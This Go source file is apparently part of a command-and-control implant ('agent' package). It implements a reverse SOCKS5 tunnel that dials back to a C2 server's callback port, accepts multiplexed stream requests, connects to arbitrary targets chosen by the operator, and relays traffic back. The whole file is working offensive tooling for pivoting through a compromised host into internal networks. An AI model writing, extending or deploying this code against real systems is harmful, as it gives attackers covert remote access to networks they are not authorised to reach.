package agent

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"sync"
	"time"
)

// Mux frame type constants.
const (
	muxSYN  byte = 1
	muxData byte = 2
	muxFIN  byte = 3
	muxOK   byte = 4
	muxERR  byte = 5
)

type rsocksClient struct {
	conn    net.Conn
	writeMu sync.Mutex
	streams sync.Map   // streamID (uint32) → net.Conn
	stop    chan struct{}
	once    sync.Once
}

var (
	globalRSocks   *rsocksClient
	globalRSocksMu sync.Mutex
)

// startRSocks connects to the C2 callback port derived from ServerURL host +
// callbackPort arg. callbackPort is a string like "54321".
func startRSocks(callbackPort string) error {
	host := serverHost(ServerURL)
	if host == "" {
		return fmt.Errorf("rsocks: cannot determine server host from ServerURL %q", ServerURL)
	}

	addr := net.JoinHostPort(host, callbackPort)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return fmt.Errorf("rsocks: dial %s: %w", addr, err)
	}

	rs := &rsocksClient{
		conn: conn,
		stop: make(chan struct{}),
	}

	globalRSocksMu.Lock()
	if globalRSocks != nil {
		globalRSocks.shutdown()
	}
	globalRSocks = rs
	globalRSocksMu.Unlock()

	go rs.readLoop()
	return nil
}

// stopRSocks stops the reverse SOCKS5 client.
func stopRSocks() string {
	globalRSocksMu.Lock()
	rs := globalRSocks
	globalRSocks = nil
	globalRSocksMu.Unlock()

	if rs == nil {
		return "rsocks: not running"
	}
	rs.shutdown()
	return "rsocks: stopped"
}

// shutdown tears down the rsocksClient once.
func (rs *rsocksClient) shutdown() {
	rs.once.Do(func() {
		close(rs.stop)
		rs.conn.Close()
		rs.streams.Range(func(key, value any) bool {
			if c, ok := value.(net.Conn); ok {
				c.Close()
			}
			rs.streams.Delete(key)
			return true
		})
	})
}

// readLoop reads mux frames from the C2 connection and dispatches them.
func (rs *rsocksClient) readLoop() {
	defer rs.shutdown()

	hdr := make([]byte, 9)
	for {
		if _, err := io.ReadFull(rs.conn, hdr); err != nil {
			return
		}

		streamID := binary.LittleEndian.Uint32(hdr[0:4])
		frameType := hdr[4]
		payloadLen := binary.LittleEndian.Uint32(hdr[5:9])

		var payload []byte
		if payloadLen > 0 {
			payload = make([]byte, payloadLen)
			if _, err := io.ReadFull(rs.conn, payload); err != nil {
				return
			}
		}

		switch frameType {
		case muxSYN:
			target := string(payload)
			go rs.handleSYN(streamID, target)

		case muxData:
			if v, ok := rs.streams.Load(streamID); ok {
				conn := v.(net.Conn)
				if _, err := conn.Write(payload); err != nil {
					rs.streams.Delete(streamID)
					conn.Close()
					rs.writeFrame(streamID, muxFIN, nil)
				}
			}

		case muxFIN:
			if v, ok := rs.streams.Load(streamID); ok {
				rs.streams.Delete(streamID)
				v.(net.Conn).Close()
			}
		}
	}
}

// handleSYN dials target on behalf of the C2 and plumbs data back.
func (rs *rsocksClient) handleSYN(streamID uint32, target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		rs.writeFrame(streamID, muxERR, []byte(err.Error()))
		return
	}

	rs.streams.Store(streamID, conn)
	rs.writeFrame(streamID, muxOK, nil)

	// Forward data from target back to C2 as DATA frames.
	go func() {
		defer func() {
			if _, loaded := rs.streams.LoadAndDelete(streamID); loaded {
				conn.Close()
				rs.writeFrame(streamID, muxFIN, nil)
			}
		}()

		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if werr := rs.writeFrame(streamID, muxData, buf[:n]); werr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()
}

// writeFrame writes a single mux frame to the C2 connection under the write mutex.
func (rs *rsocksClient) writeFrame(streamID uint32, t byte, payload []byte) error {
	rs.writeMu.Lock()
	defer rs.writeMu.Unlock()

	hdr := make([]byte, 9)
	binary.LittleEndian.PutUint32(hdr[0:4], streamID)
	hdr[4] = t
	binary.LittleEndian.PutUint32(hdr[5:9], uint32(len(payload)))

	if _, err := rs.conn.Write(hdr); err != nil {
		return err
	}
	if len(payload) > 0 {
		if _, err := rs.conn.Write(payload); err != nil {
			return err
		}
	}
	return nil
}

// serverHost extracts the hostname from a URL string like "http://10.0.0.1:8080" → "10.0.0.1".
func serverHost(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	host := u.Hostname()
	return host
}
